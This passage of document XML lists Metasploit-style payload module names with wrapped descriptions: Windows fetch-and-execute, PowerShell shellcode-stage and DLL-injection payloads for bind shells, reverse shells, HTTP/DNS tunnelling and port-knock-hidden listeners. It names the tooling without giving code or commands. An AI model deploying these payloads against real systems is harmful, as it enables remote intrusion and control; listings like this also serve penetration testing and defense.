      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_named_pipe <text:s text:c="16"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a pipe connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp <text:s text:c="23"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp_rc4 <text:s text:c="19"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp_uuid <text:s text:c="18"/>d from an https server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_http <text:s text:c="19"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_https <text:s text:c="18"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp <text:s text:c="20"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_rc4 <text:s text:c="16"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_uuid <text:s text:c="15"/>d from an https server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_winhttp <text:s text:c="16"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/https/x64/vncinject <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_winhttps <text:s text:c="15"/>d from an https server. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTPS (Windo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ws x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/jjs_reverse_tcp <text:s text:c="5"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via jjs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/adduser <text:s text:c="2"/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>ind_hidden_ipknock_tcp <text:s text:c="10"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection. First, the port will</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>need to be knocked from the IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>defined in KHOST. This IP will</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>work as an authentication metho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d (you can spoof it with tools</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>like hping). After that you cou</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ld get your shellcode from any</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>IP. The socket will appear as "</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>closed," thus helping to hide t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_hidden_tcp <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection from a hidden port and</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>spawn a command shell to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>llowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp <text:s text:c="20"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_ipv6_tcp_uuid <text:s text:c="15"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for an I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6 connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_named_pipe <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a pi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pe connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_nonx_tcp <text:s text:c="20"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp <text:s text:c="25"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_rc4 <text:s text:c="21"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/b <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tcp_uuid <text:s text:c="20"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Listen for a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nnection with UUID Support (Win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>dows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/f <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ind_tag <text:s text:c="25"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Use an establis</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hed connection</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_hop_http <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over an HTTP or HTTPS hop</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>point. Note that you must firs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t upload data/hop/hop.php to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e PHP server you wish to use as</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_http <text:s text:c="21"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows winine</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_http_proxy_pstore <text:s text:c="8"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_https <text:s text:c="20"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTPS (Windows winin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>et)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_https_proxy <text:s text:c="14"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP using SSL with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>custom proxy support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_ipv6_tcp <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_named_pipe <text:s text:c="15"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker via a named pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_nonx_tcp <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_ord_tcp <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_allports <text:s text:c="13"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Try to connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker, on all po</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ssible ports (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_dns <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4 <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_rc4_dns <text:s text:c="14"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp_uuid <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_udp <text:s text:c="22"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>the attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_winhttp <text:s text:c="18"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTP (Windows winhtt</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>p)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/custom/r <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_winhttps <text:s text:c="17"/>ommand via PowerShell. Custom s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hellcode stage. Tunnel communic</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ation over HTTPS (Windows winht</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_hidden_ipknock_tcp <text:s text:c="7"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection. First, the por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t will need to be knocked from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the IP defined in KHOST. This I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>P will work as an authenticatio</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n method (you can spoof it with</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>tools like hping). After that</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you could get your shellcode fr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>om any IP. The socket will appe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ar as "closed," thus helping to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hide the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_hidden_tcp <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection from a hidden p</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort and spawn a command shell t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_ipv6_tcp <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_ipv6_tcp_uuid <text:s text:c="12"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_named_pipe <text:s text:c="15"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_nonx_tcp <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp <text:s text:c="22"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp_rc4 <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/bind_tcp_uuid <text:s text:c="17"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/find_tag <text:s text:c="22"/>ommand via PowerShell. Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_hop_http <text:s text:c="14"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over an HTTP or HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS hop point. Note that you mu</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>st first upload data/hop/hop.ph</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>p to the PHP server you wish to</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>use as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_http <text:s text:c="18"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_http_proxy_pstore <text:s text:c="5"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_ipv6_tcp <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_nonx_tcp <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_ord_tcp <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp <text:s text:c="19"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_allports <text:s text:c="10"/>ommand via PowerShell. Try to c</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>onnect back to the attacker, on</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>all possible ports (1-65535, s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_dns <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_rc4 <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_rc4_dns <text:s text:c="11"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_tcp_uuid <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dllinjec <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t/reverse_winhttp <text:s text:c="15"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/dns_txt_ <text:s/>Execute an x86 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>query_exec <text:s text:c="22"/>ommand via PowerShell. Performs</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a TXT query against a series o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>f DNS record(s) and executes th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e returned payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/download <text:s/>Execute an x86 payload from a c</text:p>
